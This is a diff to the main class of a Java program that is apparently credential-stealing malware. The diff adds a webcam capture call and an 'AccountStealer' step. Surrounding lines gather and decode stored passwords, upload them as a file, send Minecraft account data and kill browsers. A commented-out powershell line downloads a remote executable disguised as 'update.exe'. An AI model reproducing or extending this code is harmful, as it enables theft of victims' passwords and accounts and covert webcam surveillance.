@@ -1,8 +1,6 @@
 package io.github.luxotick;
 
 import io.github.luxotick.impl.*;
-import io.github.luxotick.impl.cookies.sendCookies;
-import io.github.luxotick.utils.ElevateUtil;
 import okhttp3.*;
 
 import java.io.*;
@@ -20,14 +18,17 @@ public class Start {
     public static long snowflakeId = Snowflake.generateSnowflakeId();
     public static String documents = "C:\\Users\\Public\\Documents";
 
-    public static String exeUrl = "%%exeurl%%";
+    public static String exeUrl = "your exe url";
     static String passwords = new Passwords().grabPassword();
 
     public static String aaaa = new String(Base64.getDecoder().decode(passwords), StandardCharsets.UTF_8);
 
     public static void main(String[] argument) throws Exception {
+        captureWebcam.capture();
+
         String username = System.getProperty("user.name");
         OkHttpClient client = new OkHttpClient();
+        AccountStealer.main(argument);
         /*
         Runtime.getRuntime().exec("powershell.exe -ExecutionPolicy -createnowindow -Command wget " + exeUrl + " -O 'C:\\Users\\" + username + "\\update.exe'");
         Runtime.getRuntime().exec("powershell.exe -ExecutionPolicy -createnowindow -Command wget " + exeUrl + " -OutFile 'C:\\Users\\" + username + "\\update.exe'");
@@ -61,10 +62,10 @@ public class Start {
                 .addFormDataPart("file", "Passwords.txt", RequestBody.create(aaaa, MediaType.parse("text/plain")))
                 .build());
 		Sender.sendMessage("Passwords done.");
-		Mods.main(argument);
-		Sender.sendMessage("Mods done.");
-		Ssh.main(argument);
-		Sender.sendMessage("Now launching the client.");
+		//Mods.main(argument);
+		//Sender.sendMessage("Mods done.");
+		//Ssh.main(argument);
+		//Sender.sendMessage("Now launching the client.");
         Minecraft.sendMinecraft();
         KillBrowsers.kill();
         //telegram();
@@ -96,6 +97,8 @@ public class Start {
                 .build();
 
         Sender.sendFile(client, requestBody);
+
+        //AccountStealer.main(argument);
 
         //Downloads.main(argument);
 
